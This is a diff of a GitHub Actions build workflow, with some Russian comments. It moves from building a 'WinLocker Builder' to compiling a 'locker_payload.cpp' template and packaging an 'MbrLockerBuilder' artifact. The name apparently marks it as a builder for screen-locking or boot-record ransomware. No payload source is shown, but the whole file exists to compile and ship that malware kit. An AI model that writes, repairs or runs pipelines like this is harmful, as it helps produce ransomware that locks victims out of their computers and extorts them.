@@ -1,4 +1,4 @@
-name: Build WinLocker Builder v2.0
+name: Build
 
 on:
   push:
@@ -8,50 +8,33 @@ on:
 jobs:
   build:
     runs-on: windows-latest
-    
+
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v4
-    
-    - name: Setup MSBuild
-      uses: microsoft/setup-msbuild@v2
-    
-    - name: Setup .NET Framework
+    - uses: actions/checkout@v3
+
+    - name: Install NASM
+      run: choco install nasm -y
+
+    - name: Install Visual Studio Build Tools
+      run: choco install visualstudio2019buildtools -y
+
+    - name: Compile Template
       run: |
-        echo "Setting up .NET Framework..."
-        # .NET Framework уже установлен на windows-latest
-    
-    - name: Restore NuGet packages
-      run: |
-        dotnet restore WinLockerBuilder.csproj --runtime win-x86
-    
-    - name: Build WinLocker Builder
-      run: |
-        msbuild WinLockerBuilder.csproj /p:Configuration=Release /p:Platform="Any CPU" /p:TargetFramework=net48
-        
-        # Проверяем результат сборки
-        if (Test-Path "bin\Any CPU\Release\net48\WinLockerBuilder.exe") {
-          Write-Host "=== Build SUCCESS ===" -ForegroundColor Green
-          Get-ChildItem "bin\Any CPU\Release\net48\WinLockerBuilder.exe" | Format-Table -AutoSize
-          Copy-Item "bin\Any CPU\Release\net48\WinLockerBuilder.exe" "WinLockerBuilder_v2.exe"
-        } else {
-          Write-Host "=== Build FAILED ===" -ForegroundColor Red
-          exit 1
-        }
-    
-    - name: Upload Builder EXE
-      uses: actions/upload-artifact@v4
+        cd template
+        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
+        cl /EHsc /O2 /MT locker_payload.cpp user32.lib kernel32.lib advapi32.lib
+        move locker_payload.exe ..\builder\Resources\template.exe
+
+    - name: Setup .NET
+      uses: actions/setup-dotnet@v3
       with:
-        name: WinLockerBuilder_v2
-        path: WinLockerBuilder_v2.exe
-    
-    - name: Upload Debug Info
-      if: always()
-      uses: actions/upload-artifact@v4
+        dotnet-version: 6.0.x
+
+    - name: Build Builder
+      run: dotnet build builder/Builder.csproj -c Release -o output
+
+    - name: Upload
+      uses: actions/upload-artifact@v3
       with:
-        name: build-logs
-        path: |
-          **/*.log
-          **/*.xml
-          **/bin/
-          **/obj/
+        name: MbrLockerBuilder
+        path: output/
